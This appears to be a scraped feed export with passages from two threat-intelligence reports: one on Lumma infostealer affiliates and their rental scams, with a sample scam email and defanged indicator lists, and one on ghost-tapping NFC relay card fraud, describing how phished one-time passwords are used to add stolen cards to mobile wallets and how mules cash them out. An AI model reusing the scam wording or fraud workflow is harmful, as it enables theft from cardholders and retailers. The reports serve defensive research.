experiences in the past with people wanting to rent the property,” stating that when they “got to the property, there was no one there,” which resulted in “cancelled business appointments, wasting time and money.” Using this as justification, they asked victims to make payments via Booking.com, asserting that the process was secure and that victims would be refunded if they were dissatisfied with the apartment (see Figure 20). Notably, the same URL path (property-aid-63785823-label-gen-832513841233) observed in this activity was also seen in the final-stage URL of a rental scam campaign reported by Fortian in 2024. In that instance, victims were deceived into reserving accommodations, and the domain used appears to be a typosquatting variant, booking[.]eu-apt-booking[.]homes, hosted via Cloudflare.\nHello,\n\nUnfortunately, no, but here attached to this email you have the booking.com link from where you can rent and check the apartment.\n\nAfter we receive the booking.com confirmation that the rent procedure and the payment is completed on the platform, we can arrange the visit or the move-in directly to the apartment.\n\nWe want to let you know that the rent procedure is secured by booking.com and if you don't like the apartment you will receive the money back without any problems directly to your bank account on the same day.\n\nHere is the booking.com link where you can check the apartment and complete the rent procedure:\n\nhxxps://REDACTED/property-aid-63785823-label-gen-832513841233/en/528104900\nLet us know if you have any questions or concerns.\n\nAfter you complete the rent procedure, please send us the confirmation of it.\n\nFigure 20: Text sent to the target of a Lumma affiliate (Source: Recorded Future)\nInsikt Group also uncovered supporting evidence that the affiliate employed a similar scheme: claiming to have escrow agents worldwide, sending victims a payment link to secure a reservation, and promising that the funds would be held safely and transferred to “one of [their] available bank accounts.” In this case, Insikt Group was unable to recover the actual payment link.\nWhile the affiliate may have created their own accounts on platforms like WG-Gesucht, evidence shows they possess a large number of compromised WG-Gesucht credentials. Insikt Group hypothesizes that at least some of these credentials were stolen through the affiliate’s Lumma infections. In this context, it's important to note that while selling logs is generally lucrative, the value of certain credentials, such as those for platforms like WG-Gesucht, likely comes from their use in follow-on scams rather than direct resale, which may explain why some buyers may show limited interest in them.\nOutlook\nInsikt Group’s unique investigation into Lumma affiliates uncovered a large infostealing ecosystem enabled by a diverse set of tools and services, including proxies, VPNs, anti-detect browsers, exploit kits, crypting services, and malware detection tools. During the investigation, Insikt Group identified previously unreported tools and demonstrated how affiliates frequently run multiple scams in parallel, such as rental fraud, while leveraging additional infostealers like Vidar, Stealc, and Meduza Stealer, likely to enhance success rates and reduce the impact of detection or law enforcement disruption. Looking ahead, Lumma affiliates will likely further diversify their presence across specialized and niche forums, integrating more deeply with cryptocurrency-focused platforms and encrypted messaging ecosystems, complicating detection and disruption efforts.\nWhile many tactics and tools appear standardized across affiliates, who are likely influenced by shared guides provided by the Lumma MaaS operators, meaningful operational differences exist. These nuances are crucial for defenders, as understanding individual affiliate behaviors offers a clearer picture of how specific threats emerge and evolve within a broader ecosystem. In addition, the findings underscore that many Lumma affiliates are not casual participants, but embedded actors with deep ties to the cybercriminal underground. Their adoption of layered tool sets and diversification across malware families suggests both maturity and adaptability.\nLooking ahead, although recent law enforcement efforts temporarily disrupted Lumma’s infrastructure, the group’s swift recovery with minimal changes underscores its resilience and operational discipline. The longer-term impact of the law enforcement efforts on the individual affiliates hinges on Lumma’s ability to rebuild trust and retain them, a goal it pursues through swift restoration of its infrastructure, proactive communication, and likely feature enhancements. More broadly, the recent law enforcement operations underscore how modern cybercriminal operations function as decentralized networks, where even successful disruptions tend to have only short-term effects. Sustained mitigation will require ongoing law enforcement pressure and targeted intelligence to track the evolving tactics of individual affiliates, in addition to seeking to disrupt Lumma’s infrastructure.\nAppendix A — Ngioweb Botnet-Linked IP Addresses Used by Lumma Affiliate blackowl23\nIP Address\nPort\nASN\n162[.]210[.]192[.]136\n60136\nAS30633\n174[.]138[.]176[.]77\n26714\nAS19318\n174[.]138[.]176[.]78\n59315\nAS19318\n195[.]154[.]43[.]189\n41623\nAS12876\n209[.]159[.]153[.]19\n37726\nAS19318\n212[.]83[.]137[.]94\n59351\nAS12876\n212[.]83[.]138[.]186\n60126\nAS12876\n212[.]83[.]138[.]245\n50029\nAS12876\n212[.]83[.]143[.]103\n55734\nAS12876\n212[.]83[.]143[.]118\n10696\nAS12876\n212[.]83[.]143[.]159\n50297\nAS12876\n212[.]83[.]143[.]191\n14618\nAS12876\n38[.]91[.]107[.]229\n64336\nAS63023\n38[.]91[.]107[.]2\n56581\nAS63023\n51[.]83[.]116[.]4\n50610\nAS16276\n66[.]29[.]129[.]52\n24732\nAS22612\n67[.]213[.]210[.]115\n55168\nAS13213\n67[.]213[.]212[.]50\n10718\nAS13213\nAppendix B — Indicators of Compromise (IoCs)\nNgioweb IP Addresses:\n38[.]91[.]107[.]2\n38[.]91[.]107[.]229\n51[.]83[.]116[.]4\n66[.]29[.]129[.]52\n67[.]213[.]210[.]115\n67[.]213[.]212[.]50\n162[.]210[.]192[.]136\n174[.]138[.]176[.]77\n174[.]138[.]176[.]78\n195[.]154[.]43[.]189\n209[.]159[.]153[.]19\n212[.]83[.]137[.]94\n212[.]83[.]138[.]186\n212[.]83[.]138[.]245\n212[.]83[.]143[.]103\n212[.]83[.]143[.]118\n212[.]83[.]143[.]159\n212[.]83[.]143[.]191\n\nLumma Sample:\nb8e02f2bc0ffb42e8cf28e37a26d8d825f639079bf6d948f8debab6440ee5630\n\nMeduza Panel:\nhxxp://195[.]133[.]18[.]15/auth/login\n\nStealc Panel:\nhxxp://94[.]232[.]249[.]208/6a6fe9d70500fe64/main.php\n\nAppendix C — MITRE ATT&CK Techniques\nTactic: Technique\nATT&CK Code\nResource Development: Acquire Infrastructure: Domains\nT1583.001\nResource Development: Acquire Infrastructure: Virtual Private Server\nT1583.003\nResource Development: Acquire Infrastructure: Server\nT1583.004\nResource Development: Acquire Access\nT1650\nResource Development: Obtain Capabilities: Tool\nT1588.002\nResource Development: Compromise Accounts: Email Accounts\nT1586.002\nCommand and Control: Proxy: External Proxy\nT1090.002","enclosure":{"length":"0","type":"image/jpg","url":"https://www.recordedfuture.com/research/media_146663d7945a8f6dd5a6e50a5cdde5655e178e9a3.gif?width=1200&format=pjpg&optimize=medium"},"content":"Explore a groundbreaking investigation into Lumma affiliates: uncover their tools, tactics, scams, and integration in the cybercriminal ecosystem.

This technique allows these threat actors to provide mules with stolen payment card details linked to contactless payment systems in person to obtain physical goods, eventually transporting and reselling stolen goods for profit. Insikt Group analysts identified a key threat actor on Telegram, @webu8, advertising burner phones and ghost-tapping services to Chinese-speaking threat groups (hereafter referred to as syndicates) and engaged with threat actors involved in retail fraud campaigns. Even though Huione Guarantee, a Telegram-based criminal marketplace, announced it shut down its operations on May 13, 2025, we observed cybercriminals and syndicates have since been using Huione Guarantee’s existing massive decentralized infrastructure on Telegram to conduct dealings. Chinese-speaking cybercriminals have also pivoted to Xinbi Guarantee and Tudou Guarantee platforms as one-stop shops to recruit ghost-tapping, transportation, reseller, and money laundering mules. We believe that established, Southeast Asia-based criminal groups that have been involved in scamming activities (romance, investment scam, and cryptomining, among others) since 2020 have begun and will continue to incorporate ghost-tapping campaigns into their activities for financial gains.</p>\n        <p>This report includes the key findings of our engagement with threat actors, analysis of video demonstrations showcasing ghost-tapping and contactless ATM withdrawals, open-source research, and law enforcement advisories to explain the Chinese ghost-tapping ecosystem. Insikt Group assesses that ghost-tapping campaigns are difficult to detect due to a lack of Know-Your-Customer (KYC) measures at retail stores and because syndicates can send mules claiming to be tourists to purchase physical goods and resell them for profit. These campaigns can negatively impact retail, banking, contactless payment providers, and insurance companies as a result of unauthorized payment card transactions belonging to payment cardholders. Although ghost-tapping campaigns have been widely reported in Singapore due to high-profile arrests, these campaigns can be conducted on a global scale.</p>\n        <h2>Key Findings</h2>\n        <ul>\n          <li>Chinese-speaking cybercriminals are using automation to add stolen payment card information to contactless payment wallets, selling burner phones, and providing an unspecified peripheral software capable of relaying payment card details to separate mobile devices to multiple Chinese-speaking criminal syndicates. Syndicates can also send burner phones back to these cybercriminals to recycle them for future retail fraud campaigns.</li>\n          <li>Threat actors involved in ghost-tapping activities claim the technique can work worldwide, with some groups likely based in Cambodia and China. Through our engagements, we identified some threat actors that only operate domestically within China and other specific geographical locations such as Singapore, Malaysia, Thailand, and the Philippines.</li>\n          <li>Many criminal groups are using ghost-tapping techniques to conduct ATM withdrawals and purchase luxury goods such as jewelry and mobile phones at retail stores. Once these goods have been purchased, threat actors resell them for cash on Telegram channels like Tudou Guarantee, Xinbi Guarantee, and Huione Guarantee.</li>\n          <li>Due to the large number of advertisements regarding ghost-tapping campaigns and recruitment of mules to purchase physical goods using ghost-tapping techniques on Huione Guarantee, Xinbi Guarantee, and Tudou Guarantees, we believe a large number of physical goods being sold on these Chinese cybercrime marketplaces are obtained through ghost-tapping techniques.</li>\n        </ul>\n        <h2>Background</h2>\n        <p>“Ghost Tap” is a term <a href=\"https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay\">coined</a> by Threat Fabric. It describes a tactic that threat actors use to cash out money after they have stolen credit card details linked to mobile payment services (such as Google Pay or Apple Pay). It also involves relaying NFC traffic, where cybercriminals phish or procure stolen payment cards and load them onto mobile wallets, which are then used for fraudulent transactions. Insikt Group defines ghost-tapping as NFC relay fraud; ghost-tapping involves criminals using mobile devices to relay payment information from a victim's card or device to a payment terminal without the victim's knowledge. Once the payment card information is stolen and loaded into mobile wallets, criminals can transmit an NFC signal containing payment card information to a different phone and scale the operation, which can greatly boost mobile wallet-related fraud.</p>\n        <p>Recorded Future’s Payment Fraud Intelligence team has published a report titled “Mobile Wallet, Phishing, and Scam Nexus Supports Globally Distributed Card Fraud.” The report’s findings show that NFC relay fraud is an emerging and effective attack method that allows cybercriminals to conduct unauthorized transactions using stolen payment card credentials. Threat actors leverage phishing campaigns and malware to compromise payment cards and intercept one-time passwords (OTPs), which are often essential for adding these cards to mobile wallets. By using open-source NFC relay tools, such as <a href=\"https://github.com/nfcgate/nfcgate\">NFCGate</a>, attackers can transmit or relay tokenized card data in real time to other mobile devices. This method allows threat groups based anywhere in the world to:</p>\n        <ul>\n          <li>Centrally manage phishing campaigns to compromise payment cards belonging to victims in foreign countries and fraudulently activate the cards on mobile wallets under their control</li>\n          <li>Relay the NFC traffic of compromised payment cards provisioned on mobile wallets to money mules who conduct fraudulent, tap-to-pay card-present transactions in the victims’ countries</li>\n        </ul>\n        <p>Ghost-tapping campaigns consist of cyber and physical elements that require cybercriminals and syndicates to collaborate for the scheme to succeed. These cybercriminals use phishing campaigns, mobile malware, and social engineering techniques to obtain payment card credentials and one-time passwords to link payment card credentials belonging to victims to contactless payment systems (such as Apple Pay and Google Pay) on burner phones. The cybercriminals will then proceed to sell the burner phones loaded with payment card information and develop proprietary software capable of relaying payment card data to Chinese-speaking syndicates for ghost-tapping campaigns. In essence, cybercriminals only fulfill the cyber spectrum of ghost-tapping campaigns.</p>\n        <p>Syndicates are well-established criminal groups looking to launder their illegally acquired gains through ghost-tapping campaigns. In ghost-tapping campaigns, the role of syndicates is to work closely with cybercriminals, hire mules to purchase physical goods using burner phones loaded with payment card credentials, and eventually resell the physical goods for cash. Syndicates are responsible for hiring mules, establishing their own contacts, strengthening their networks and supply chains to launder money through ghost-tapping campaigns. Syndicates fulfill both the cyber and physical spectrum of ghost-tapping campaigns. In November 2024, The Straits Times <a href=\"https://www.straitstimes.com/singapore/courts-crime/criminal-groups-from-china-spreading-out-to-south-east-asia-including-s-pore-experts\">reported</a> that criminal syndicates from China have been setting up bases in countries such as the Philippines, Australia, and Singapore to launder their gains from illegal activities such as illegal online gambling and scam campaigns as early as 2016.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_157596d9fbdb994daf789bbec005f58a4d739a7c6.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1566\" height=\"698\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 1:</em></strong> <em>Overview of ghost-tapping campaign involving mobile wallets; an additional proprietary software is required to relay NFC traffic containing payment card data to another mobile phone from the attacker’s C2 infrastructure (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <p>According to a <a href=\"https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay\">Threat Fabric</a> report on ghost-tapping, the prerequisites for the tactic to be executed include a mobile device with NFC with stolen payment card data linked to a mobile payment system (most often iOS or Android), two mobile devices with <a href=\"https://github.com/nfcgate/nfcgate\">NFCGate</a> installed, and a server configured to relay the traffic.

Of these cases, at least 502 reports involved compromised payment cards that were linked to Apple Pay. After successfully linking victims’ credit card information to Apple Wallets, mules working for scam syndicates could make in-person purchases using NFC mobile payment methods to buy physical goods in-store, such as high-value electronic items or luxury goods.</p>\n        <p>In November 2024, The Straits Times <a href=\"https://www.straitstimes.com/singapore/scam-syndicates-sending-foreigners-into-singapore-to-cheat-retailers-like-apple-store-and-best-denki\">reported</a> about an emerging trend of foreign nationals being sent to Singapore by syndicates to commit payment card fraud at retail outlets across the country. Singaporean authorities also warned retailers about syndicates who has supposedly stolen the payment card details of victims through a series of online phishing scams. Stolen payment card details were then loaded onto an unspecified mobile application, which could be controlled remotely and used for contactless payments that work with point-of-sale (POS) terminals. Foreigners are believed to be recruited by transnational syndicates in their home countries via social messaging platforms and instructed to enter Singapore to buy items such as expensive mobile phones, electronic accessories, luxury goods, jewelry, and gold bars. Investigations from the Singapore Police Force <a href=\"https://www.straitstimes.com/singapore/courts-crime/jail-for-two-men-linked-to-syndicate-who-came-to-singapore-to-commit-cheating-but-backed-out\">revealed</a> that mules recruited by Chinese syndicates also obtained images of fake Japanese passports to be used as proof of identity during the process of in-person purchases at retail stores, and credit card details had been unlawfully obtained through phishing. This case is most likely an example of ghost-tapping, as it involves payment card details loaded onto an unspecified mobile application that can be controlled remotely and used for contactless payments that work with point-of-sale (POS) terminals. The mobile application is most likely used for relaying NFC traffic involving payment card information from another device in real time.</p>\n        <p>We observed criminals buying and selling stolen goods on criminal sources, such as the Telegram marketplaces Huione Guarantee, Xinbi Guarantee, and Tudou Guarantee. There have been reports (<a href=\"https://www.straitstimes.com/singapore/courts-crime/2-men-allegedly-linked-to-overseas-crime-syndicate-charged-with-cheating\">1</a>, <a href=\"https://www.straitstimes.com/singapore/courts-crime/woman-charged-for-alleged-role-in-government-impersonation-scam?_nei=65aae3a1-dd94-4552-9f4d-0a8a64d3d5a2\">2</a>) of similar cases using the same TTPs involving individuals belonging to different nationalities.

The advisory states that after obtaining a victim’s payment card credentials, a scammer would then add the card details to the Apple Wallet on their own device. An SMS one-time password (OTP) would be sent to the victim, who is then tricked into entering the OTP into the phishing website operated by the scammer, thereby giving the scammer access to the victim’s payment card. After successfully taking over the victim’s payment card, the scam syndicate would conspire with a money mule to make unauthorized transactions by connecting the mule’s mobile device to the scammer’s Apple Wallet. The money mule would then be able to make in-person purchases using the contactless payment method (NFC) to buy goods in-store. This police advisory is likely describing ghost-tapping, where there is a need to connect the mule’s mobile device to mobile wallets controlled and operated by syndicates remotely.</p>\n        <p>In April 2025, two Chinese nationals were <a href=\"https://www.zaobao.com.sg/realtime/singapore/story20250509-6316228\">arrested</a> for smuggling fifteen iPhones into Singapore from China; the individual and an accomplice were instructed by an unspecified syndicate to throw the phones into a trash can outside a local shopping mall. Insikt Group assesses with high confidence that the two individuals are likely transportation mules recruited by a Chinese-speaking syndicate, and the iPhones likely contain stolen payment card credentials that were already linked to Apple Pay. Once retrieved, the syndicate would have used the phones to activate ghost-tapping mules already residing within Singapore, who would then use them to buy physical goods in person. This case is an example of mobile wallet fraud, which involves burner phones loaded with stolen payment card information and does not require the use of NFC relay tactics.</p>\n        <h2>Ghost-Tapping and the Criminal Ecosystem</h2>\n        <p>Since 2024, Insikt Group has observed Chinese cybercriminals operating on Telegram-based escrow platforms, such as Huione Guarantee, Xinbi Guarantee, and Tudou Guarantee, to advertise criminal services and TTPs from general scamming to cryptomining. Through engagements with threat actors involved in different aspects of criminality, we learned that Chinese-speaking criminals involved in scamming-related activities are now adopting ghost-tapping into their attack vectors. We identified that ghost-tapping threat actors are based in Southeast Asian nations, specifically in Cambodia, and have been selling burner phones loaded with payment card credentials belonging to victims to multiple Chinese-speaking syndicates. A single ghost-tapping criminal group possesses the means and ability to provide essential items such as burner phones and loan proprietary software to multiple Chinese-speaking syndicates. This means that the existence of multiple ghost-tapping criminal groups would be able to facilitate a very large number of Chinese-speaking syndicates for many different ghost-tapping campaigns that target multiple businesses — specifically in the retail sector — globally.</p>\n        <p>In addition to advertising ghost-tapping services, we observed Chinese-speaking syndicates recruiting mules to conduct purchases on the three above-mentioned Telegram marketplaces. The syndicates will usually hire Chinese-speaking mules to conduct operations on their behalf, with mules traveling to foreign countries, such as Singapore, under the guise of tourists to purchase high-value physical goods such as gold, luxury items, and mobile phones. Chinese criminal syndicates will then resell the items on three Telegram marketplaces for cash.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1598553e9b24aff5dfc3b095ff2fdb2502cb1b339.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"924\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 4:</em></strong> <em>Overview of the ghost-tapping ecosystem showing how cybercriminals can facilitate ghost-tapping campaigns for multiple Chinese-speaking syndicates (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <h3>Definition of Different Types of Threat Actors and Mules in the Ghost-Tapping Ecosystem</h3>\n        <p>Through observations, threat actor engagements, and open-source intelligence (OSINT) reporting, Insikt Group defines different types of threat actors and their roles within ghost-tapping campaigns as follows:</p>\n        <ul>\n          <li><strong>Cybercriminal:</strong> Obtains stolen payment card credentials and links them to contactless payment services such as Apple Pay and Google Pay. Cybercriminals develop software capable of relaying NFC traffic, including payment card data, in real time to other mobile devices, and they typically sell payment card information to syndicates looking to commit retail fraud via ghost-tapping campaigns.

For example, the threat actor “路飞” (@OPLuffy888) advertised express transportation services for physical goods on Xinbi Guarantee to transport goods within and beyond Malaysia, Singapore, Indonesia, and Thailand.

Huione Guarantee serves as a platform for thousands of public and private Chinese-language Telegram groups that provide various services that enable cybercriminal activities, providing escrow services to Chinese-speaking cybercriminals. Elliptic <a href=\"https://www.elliptic.co/blog/huione-largest-ever-illicit-online-marketplace-stablecoin\">reported</a> that illicit cryptocurrency-based activities linked to Huione Group reached at least $24 billion. Threat actors advertised the sale of social media and e-commerce accounts, SIM cards, data containing personally identifiable information (PII), malware-as-a-service (MaaS), deepfake technology, KYC bypass services, money-laundering methods and services, and more. For more information about Huione Guarantee, please refer to the Insikt Group report “Huione Guarantee Serves as a One-Stop Shop for Chinese-Speaking Cybercriminals.”</p>\n        <p>Despite Huione Guarantee announcing the shutdown of their operations on May 13, 2025, we observed cybercriminals continuing to use Huione Guarantee’s vast infrastructure on Telegram to facilitate criminal activities and dealings. In addition, we observed cybercriminals pivoting to Xinbi Guarantee (@xbdb) and Tudou Guarantee (@tddb), two other Telegram-based marketplaces that function the same way as Huione Guarantee and serve as viable alternatives for Chinese-speaking cybercriminals to continue recruiting members for their cyber, fraud, and scamming campaigns. All deposits have to be made in USDT to a cryptocurrency wallet operated by Xinbi Guarantee and Tudou Guarantee’s customer service representatives.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1f04e60c8f44c06c35268e32e93f6f13391bfb756.png?width=750&amp;format=png&amp;optimize=medium\" width=\"960\" height=\"540\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 7:</em></strong> <em>Xinbi Guarantee and Tudou Guarantee are platforms that provide escrow services similar to Huione Guarantee to facilitate the hiring of ghost-tapping, transportation, reseller, and money-laundering mules (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <p>We observed Chinese-speaking cybercriminals advertising first-hand (一道) and second-hand (二道) payment cards on all three Telegram marketplaces for ghost-tapping campaigns. 远程刷卡 refers to remote card swiping, and in this case, it refers to ghost-tapping operations. Cybercriminals typically use USDT to purchase these payment card details belonging to victims, and the cards are advertised to work globally, including with NFC and POS terminals.</p>\n        <p>In <strong>Figure 8</strong>, the administrator of Xinbi Guarantee was observed advertising multiple channels involved in ghost-tapping operations on the now-defunct Xinbi Guarantee’s public community channel (新币公群频道; @gqdh). The administrator advertised more than ten different channels involved in ghost-tapping campaigns that include first- and second-hand payment cards, which indicates that multiple cybercriminal groups and Chinese-speaking syndicates are actively participating in such campaigns.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1a907f58c51c81a8a87bf5c2afaaca3e334b7ae2a.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1045\" height=\"1437\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 8:</em></strong> <em>An administrator of Xinbi Guarantee posting an advertisement about using first- and second-hand victim payment card credentials for ghost-tapping campaigns worldwide; the Telegram channel @gqdh, which used to be Xinbi Guarantee’s public community Telegram channel, has been deleted by Telegram, likely due to a violation of use terms (Source: Telegram)</em></div>\n          </div>\n        </div>\n        <h4>Reselling of Goods to Launder Funds</h4>\n        <p>On Huione Guarantee, Xinbi Guarantee, and Tudou Guarantee platforms, we observed threat actors offering to purchase and sell physical items obtained through illicit means in large quantities. Chinese-speaking syndicates typically do not specify how and where they obtained such physical items, but through our research, we believe there are two common methods: ghost-tapping campaigns and e-commerce fraud. The e-commerce method is considered more risky due to more digital and physical footprints, as key details such as online card payment details, physical addresses, and phone numbers are required. In comparison, ghost-tapping campaigns are much harder to detect by law enforcement agencies, and mules can travel to foreign countries and purchase physical goods on behalf of syndicates. These in-person transactions performed by mules grant syndicates the advantage of obtaining goods immediately and with greater control, often issuing specific instructions in real time to mules to deliver the goods to specific locations that could remain unknown to authorities for prolonged periods of time.</p>\n        <p>Due to the large number of advertisements regarding ghost-tapping campaigns and recruitment of mules to purchase physical goods using ghost-tapping techniques, all being discussed and advertised together on Huione Guarantee, Xinbi Guarantee, and Tudou Guarantees, coupled with OSINT articles and a Singapore Police Force advisory (<a href=\"https://www.straitstimes.com/singapore/courts-crime/2-men-allegedly-linked-to-overseas-crime-syndicate-charged-with-cheating\">1</a>, <a href=\"https://www.straitstimes.com/singapore/scam-syndicates-sending-foreigners-into-singapore-to-cheat-retailers-like-apple-store-and-best-denki\">2</a>, <a href=\"https://www.police.gov.sg/media-room/news/20250217_unauthorised_card_transactions_made_using_contactless_payment_methods_in_singapore\">3</a>) detailing ghost-tapping crimes, we believe with a high degree of confidence that a large number of physical goods being sold on these Chinese cybercrime marketplaces are obtained through ghost-tapping techniques.</p>\n        <p>Based on advertisements on the three above-mentioned Telegram channels, Figure 9 illustrates how physical goods get transported and resold for cash as part of money-laundering operations by Chinese-speaking syndicates. It is highly likely that Chinese-speaking syndicates involved in ghost-tapping campaigns will resell physical items bought with stolen payment card credentials for cash.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1adb3b83b6a856276d1e2de054c6844bb04e7a30c.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"731\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 9:</em></strong> <em>How physical goods get transported and resold for USDT/cash as part of money laundering operations by Chinese-speaking syndicates (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <p>For example, we observed the threat actor “莫淮” (@eyDLBhqqotRXfJ) buying gold, mobile phones, and other physical goods that syndicates can offload in large quantities on Xinbi Guarantee.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_11ae6f783f2cf0a55cc8d4d8e3de611cfd5b74f47.png?width=750&amp;format=png&amp;optimize=medium\" width=\"586\" height=\"304\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 10:</em></strong> <em>Threat actor 莫淮 (@eyDLBhqqotRXfJ) offering to buy gold, mobile phones, and other physical goods that can be offloaded by syndicates in large quantities on Xinbi Guarantee (Source: Telegram)</em></div>\n          </div>\n        </div>\n        <h2>Threat Analysis and Engagements</h2>\n        <p>Insikt Group conducted engagements with two Telegram monikers involved in different aspects of the ghost-tapping ecosystem: @webu8 (developer of proprietary software used in ghost-tapping) and @xingma888 (controller and recruiter of mules who purchase and resell luxury goods purchased through ghost-tapping). These engagements gave us valuable insights into the organization, structure, security measures, and TTPs used by these threat actors and their associates.</p>\n        <h3>@webu8: Ghost-Tapping Software Developer</h3>\n        <h4>Background</h4>\n        <p>Insikt Group discovered a public Chinese-language Telegram channel, cvv教学顶端学习禁广告 (@daoshua00), which has 5,695 members as of writing. This channel promotes ghost-tapping and carding-related services, as well as materials used in ghost-tapping campaigns, specifically first-hand phishing materials, penetration techniques, CVV tutorials, ATM card cloning, and exfiltration of databases. The administrators of this channel operate the Telegram handles @webu8 and @xbdb0. We note that @xbdb0 is similar to Xinbi Guarantee’s Telegram channel (@xbdb), and through our engagement with @xbdb0, the threat actor claimed they have connections with Xinbi Guarantee. We observed the administrators posting photos and video demonstrations of ghost-tapping for syndicates interested in conducting ghost-tapping campaigns. The videos and photos mainly consisted of cash, multiple burner mobile phones with compromised payment cards linked to Apple Pay and Google Pay services, cloned payment cards, and POS terminals. Individuals were asked to contact @webu8 for more information. We engaged with @webu8 and managed to get information and the description of the software being used for ghost-tapping purposes.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_107d9fb919a96ae274675bc64294ea17a85a66b54.png?width=750&amp;format=png&amp;optimize=medium\" width=\"725\" height=\"256\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figures 11 and 12:</em></strong> <em>(Left) Administrators of @daoshua are @webu8 and @xbdb0 (Source: Telegram); (Right) Xinbi Guarantee’s Telegram channel’s sharelink is @xbdb, which is very similar to the administrator of @daoshua00, whose moniker is @xbdb0; through engagement, @xbdb0 claimed to have connections with Xinbi Guarantee (Source: Telegram)</em></div>\n          </div>\n        </div>\n        <p>The three images below, shown in <strong>Figure 13</strong>, showcase @webu8’s advertisements on the Telegram channel @daoshua00.</p>\n        <p>The first image on the left shows multiple burner phones tagged with linked payment card credentials. Each phone is tagged with a card binding time (day and month the payment card was linked to the burner phone) and the quantity of compromised payment cards linked. The price of each phone is 90 USDT (approximately $90), and each linked card is 41 USDT (approximately $41); a minimum purchase of five burner mobile phones is required. If a burner phone contains ten linked compromised payment cards, the price of the phone is $500 USDT. The burner phone can be purchased in Putian City, Fujian Province, China. The threat actor used the Chinese text 莆田可面基 打速卖通的不要找我！禁止打国内!, which translates to: “Able to meet in Putian, please do not contact me if you use AliExpress! Domestic calls are prohibited!” Insikt Group assessed that such measures are to maintain anonymity and avoid detection by China’s law enforcement agencies, and having in-person meetups would be more secure to build a strong and stable relationship among Chinese cybercriminals. @webu8 also provided a phone recycling service for Chinese-speaking syndicates, likely to load new compromised payment card credentials into existing burner phones. We note that in August 2023, law enforcement agencies in Singapore <a href=\"https://www.straitstimes.com/singapore/1b-in-cash-and-assets-seized-and-frozen-30-foreigners-probed-for-money-laundering-and-forgery\">arrested</a> ten Chinese-speaking syndicate members originating from Fujian, China, and seized assets worth $3 billion Singapore dollars ($2.33 billion USD). The members are linked to unlicensed money lending in China, scams, and remote online gambling operations in the Philippines. Insikt Group is unable to confirm whether @webu8 and @xbdb0 are linked to the same syndicate whose members were arrested in 2023.</p>\n        <p>The second image in the middle showcases @webu8 advertising stolen card credentials linked to an unspecified contactless payment system, with payment card values indicating available remaining credit. The threat actor claims these cards are compatible with Apple Pay and Google Pay, have ready stocks for sale, and can be used for ghost-tapping purposes.</p>\n        <p>The third image on the right showcases @djdj8884, another ghost-tapping seller, advertising US payment cards with PIN codes obtained from phishing campaigns. The threat actor is seeking to supply newly phished payment cards regularly to Chinese-speaking syndicates. The cards are advertised to be compatible with making payments to purchase physical goods over POS machines. The screenshot shows burner phones loaded with multiple cards, indicating that the buyer can load the payment card information, together with PIN codes, into their own burner phones.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1c7cf6faa20b6dea2686ab4d4f7f1e0cb188fd7cf.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"960\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 13:</em></strong> <em>@webu8 advertising burner iPhones loaded with stolen payment card credentials; each mobile phone is tagged with a serial number, and all phones are either set to airplane mode or have no SIM cards inside (Source: Telegram)</em></div>\n          </div>\n        </div>\n        <p>From these three images, we observed two business models used by ghost-tapping criminals:</p>\n        <ol>\n          <li>@webu8 threat group’s business model is to load compromised payment card credentials onto burner phones, getting syndicate members to deal in person with the buyer located in “Putian”, a city in Fujian Province, China. For this business model, the buyer is getting burner phones that are already loaded successfully and ready for ghost-tapping campaigns.</li>\n          <li>@djdj8884 threat group’s business model sells compromised payment card credentials in bulk, together with PIN codes to other Chinese-speaking syndicate members, where transactions can be conducted remotely. For this business model, the buyer is responsible for loading compromised payment card credentials into their own burner phones to prepare for future ghost-tapping campaigns. Insikt Group assessed that this business model requires more preparation time, as not all compromised cards can be loaded into a contactless payment system due to varying security measures employed by different banks.</li>\n        </ol>\n        <p>We also obtained evidence through proprietary means that cybercriminals are automating the process of linking compromised card credentials to contactless payment systems on burner phones. The screenshot below shows automated attempts to add a compromised payment card belonging to DBS Bank to Apple Pay at intervals of every four to eight minutes. In this case, DBS Bank employs a <a href=\"https://www.dbs.com/newsroom/DBS_introduces_new_Mobile_wallets_security_feature_to_further_protect_customers_from_phishing_frauds\">security feature</a> that requires an individual to log in to their mobile application to authorize the authentication of linking their payment cards to a mobile wallet such as Apple Pay or Google Pay. Customers who wish to add their DBS card must first turn on the “Mobile wallets” toggle in Payment Controls within the DBS digibank app. To further protect users, this “Mobile wallets” feature will be automatically turned off if the card is not added to any mobile wallet within ten minutes. However, in the event that an individual’s bank login details are compromised due to 